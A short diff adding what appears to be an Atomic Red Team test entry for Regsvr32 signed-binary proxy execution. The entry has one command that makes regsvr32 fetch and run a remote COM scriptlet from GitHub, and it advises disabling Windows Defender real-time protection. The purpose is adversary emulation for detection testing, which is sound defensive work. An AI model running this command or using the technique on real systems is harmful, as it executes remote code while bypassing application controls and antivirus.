@@ -1,0 +1,8 @@
+#TechniqueName: Signed Binary Proxy Execution: Regsvr32
+#AtomicTestName: Regsvr32 remote COM scriptlet execution
+#Description: Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable&windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.&
+#Language: cmd
+
+#commands
+C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
+
